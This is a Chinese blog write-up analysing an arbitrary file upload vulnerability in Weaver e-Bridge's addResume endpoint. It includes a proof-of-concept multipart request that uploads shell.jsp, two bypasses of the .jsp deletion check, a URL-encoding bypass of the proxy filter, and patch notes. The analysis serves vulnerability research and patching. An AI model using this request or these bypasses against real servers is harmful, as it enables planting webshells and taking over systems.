title: 泛微云桥e-Bridge addResume 任意文件上传漏洞分析
author: Bmth
tags: []
categories:
  - 代码审计
top_img: 'https://i-blog.csdnimg.cn/direct/93e4bbceaef34eeb8827c5d6f5545987.png'
cover: 'https://i-blog.csdnimg.cn/direct/93e4bbceaef34eeb8827c5d6f5545987.png'
date: 2024-08-17 19:22:00
---
谁翻乐府凄凉曲？风也萧萧，雨也萧萧，瘦尽灯花又一宵。
不知何事萦怀抱，醒也无聊，醉也无聊，梦也何曾到谢桥。

## 环境搭建
官方：[https://wx.weaver.com.cn/download](https://wx.weaver.com.cn/download)
下载：[https://wxdownload.e-cology.com.cn/ebridge/ebridge_install_win64_server2008R2_20200819.zip](https://wxdownload.e-cology.com.cn/ebridge/ebridge_install_win64_server2008R2_20200819.zip)

根据日志可以下载到 2023-08-21 补丁：[https://wxdownload.e-cology.com.cn/ebridge/ebridge_patch_20230821.zip](https://wxdownload.e-cology.com.cn/ebridge/ebridge_patch_20230821.zip)

1、右键点击 install64.bat  以管理员身份运行进行程序安装
2、安装完成之后 访问 
http://服务器IP:8088 
3、登陆系统  sysadmin/1

![](https://i-blog.csdnimg.cn/direct/93e4bbceaef34eeb8827c5d6f5545987.png)


## 漏洞分析
### addResume文件上传
看到`weaver.weixin.app.recruit.controller.ResumeController#addResume`
![](https://i-blog.csdnimg.cn/direct/e447d6bef1de4b94b3417a0273c76d6b.png)

调用 getWxBaseFile 方法进行文件上传
`weaver.weixin.core.controller.BaseController#getWxBaseFile`
![](https://i-blog.csdnimg.cn/direct/0872c55eda1f4c4a960ca06b91575a15.png)

先看一下`_filePath`的生成
`weaver.weixin.base.file.FileUploadTools#getRandomFilePath`
```java
public static String getRandomFilePath() {
    return initFilePath();
}
public static String initFilePath() {
    return initFilePath("");
}
public static String initFilePath(String prePath) {
    StringBuffer sb = new StringBuffer();
    if (GCONST.getFileRootPath() != null && !"".equals(GCONST.getFileRootPath())) {
        sb.append(GCONST.getFileRootPath());
    } else {
        sb.append(PathKit.getWebRootPath() + File.separator + "upload");
    }

    if (StrKit.notBlank(prePath)) {
        sb.append(File.separator + prePath + File.separator + sdf.format(new Date()));
    } else {
        sb.append(File.separator + sdf.format(new Date()));
    }

    sb.append(File.separator + getUpEng());
    return sb.toString();
}

public static String getUpEng() {
    Random r = new Random();
    char c = (char)(r.nextInt(26) + 65);
    char b = (char)(r.nextInt(26) + 65);
    return String.valueOf(c) + String.valueOf(b);
}
```
很明显文件路径是日期加上随机两位大写字母

接下来调用到 JFinal 的文件上传getFile方法
```
at com.jfinal.core.Controller.getFile
at com.jfinal.core.Controller.getFiles
at com.jfinal.upload.MultipartRequest.<init>
at com.jfinal.upload.MultipartRequest.wrapMultipartRequest
```
![](https://i-blog.csdnimg.cn/direct/d0918f5360704feea381b455651ce8dc.png)

生成文件路径，然后调用`com.oreilly.servlet.MultipartRequest#MultipartRequest`

如果存在文件上传操作，则会直接writeTo写文件
![](https://i-blog.csdnimg.cn/direct/a0e2dd8b25414e529525059974a07f46.png)

但是在后续的处理中执行了isSafeFile
```java
if (this.isSafeFile(uploadFile)) {
    this.uploadFiles.add(uploadFile);
}
private boolean isSafeFile(UploadFile uploadFile) {
    if (uploadFile.getFileName().toLowerCase().endsWith(".jsp")) {
        uploadFile.getFile().delete();
        return false;
    } else {
        return true;
    }
}
```
如果后缀为.jsp，则会删除文件

而在泛微云桥中，重写了该方法`\WEB-INF\classes\com\jfinal\upload\MultipartRequest.class`
![](https://i-blog.csdnimg.cn/direct/ca5a0ee0b68a4519bf853567411c491b.png)

如果后缀存在.jsp，则会删除该文件

### 逻辑缺陷绕过
姿势一：
该框架存在一个历史漏洞：[https://github.com/jfinal/jfinal/issues/171](https://github.com/jfinal/jfinal/issues/171)

如果在文件写入之后、触发 isSafeFile 之前发生异常，那么文件就会被保留下来
```
POST /wxclient/app/recruit/resume/addResume HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: */*
Host: 192.168.111.138:8088
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------439073446803390067215790
Content-Length: 352

----------------------------439073446803390067215790
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<%out.println("test");%>
----------------------------439073446803390067215790
Content-Disposition: form-data: name="test"

test
----------------------------439073446803390067215790--
```
![](https://i-blog.csdnimg.cn/direct/bde1d541ed054339a8742d097ba4a32a.png)

第二个from-data产生异常即可

姿势二：
文件名是从`this.multipartRequest.getFilesystemName(name);`中获取到的，参数name为文件上传请求的name值
![](https://i-blog.csdnimg.cn/direct/1938d25ea5034e4c96db86fd6e47fd21.png)

而 this.files 是用来存储文件上传的键值对的，假如我们上传两个键值一样的文件，那么我们第二个请求的key值就会覆盖掉之前的key值
![](https://i-blog.csdnimg.cn/direct/040af4480cf246709024159563627fb2.png)

成功上传
![](https://i-blog.csdnimg.cn/direct/4dc3d86120e54727891141454d8191a0.png)


## 漏洞利用
在访问我们的jsp文件时，发现直接302跳转：`Location: /wxapi/erropage?errcode=-15`

看到 web.xml 全局配置
```xml
<filter>
	<filter-name>jfinal</filter-name>
	<filter-class>com.jfinal.core.JFinalFilter</filter-class>
	<init-param>
		<param-name>configClass</param-name>
		<param-value>weaver.weixin.core.WxJFinalConfig</param-value>
	</init-param>
</filter>

<filter-mapping>
	<filter-name>jfinal</filter-name>
	<url-pattern>/*</url-pattern>
</filter-mapping>
```
`weaver.weixin.core.WxJFinalConfig#configHandler`
![](https://i-blog.csdnimg.cn/direct/63be5e16c49a4bdea682e654e1d48673.png)

`weaver.weixin.outsys.api.OutSysProxyHandler#loadProxys`
![](https://i-blog.csdnimg.cn/direct/1f3fa332bab5453ba632df1082466e8f.png)

读取`WEB-INF\proxy.xml`中的配置并加载，注意到
```xml
<view>
    <pattern>*.jsp</pattern>
    <pattern>/weaver/*</pattern>
    <pattern>/mobile/plugin/*</pattern>
    <pattern>/mobilemode/*</pattern>
</view>
```
代码方面的处理
```java
List<Node> list7 = document.selectNodes("/proxy/includes/view/pattern");
Iterator<Node> it7 = list7.iterator();
while (it7.hasNext()) {
    Node element7 = it7.next();
    String pattern7 = element7.getText();
    if (StringUtils.isNotEmpty(pattern7)) {
        view.add(pattern7);
    }
}
proxys.put(WxConsts.BUTTON_VIEW, view);
```
看到 isLocalRequestURL 方法
![](https://i-blog.csdnimg.cn/direct/9ebece560d214804a26299ca4ddcc2e2.png)

进行正则匹配，如果匹配到对应的字符串，则直接返回false，这就是为什么不能直接访问.jsp

细心发现匹配的是`request.getRequestURI()`，我们可以直接URL编码绕过
参考：[getRequestURI 导致的安全问题](https://www.cnblogs.com/depycode/p/16124191.html)

![](https://i-blog.csdnimg.cn/direct/673e88ff0581471e8fda9b1fd45b9a38.png)


### 实战（鸡肋）
这里就要问了，为什么实战不管什么版本都无法复现呢，我们来看一下

后台的基础参数设置中
![](https://i-blog.csdnimg.cn/direct/7ef474aa34224549a0d12a386c0eeccd.png)

如果设置了**云桥系统文件存放路径**，那么在 initFilePath 的时候
```java
public static String initFilePath(String prePath) {
    StringBuffer sb = new StringBuffer();
    if (GCONST.getFileRootPath() != null && !"".equals(GCONST.getFileRootPath())) {
        sb.append(GCONST.getFileRootPath());
    } else {
        sb.append(PathKit.getWebRootPath() + File.separator + "upload");
    }

    if (StrKit.notBlank(prePath)) {
        sb.append(File.separator + prePath + File.separator + sdf.format(new Date()));
    } else {
        sb.append(File.separator + sdf.format(new Date()));
    }

    sb.append(File.separator + getUpEng());
    return sb.toString();
}
```
就会走入if条件内，文件路径为我们设置的存放路径，而默认推荐的路径为：
```
C:\Users\bmth\Downloads\ebridge_install_win64_server2008R2_20200819\ebridge\file
```
不在web目录下！！！


## 漏洞修复
下载补丁：[https://wxdownload.e-cology.com.cn/ebridge/ebridge_patch_20231116.zip](https://wxdownload.e-cology.com.cn/ebridge/ebridge_patch_20231116.zip)

发现删除了该方法
![](https://i-blog.csdnimg.cn/direct/515a872bfa0d46bd8609d857ceb695bf.png)


参考：
[浅谈JFinal请求解析过程](https://forum.butian.net/share/2269)

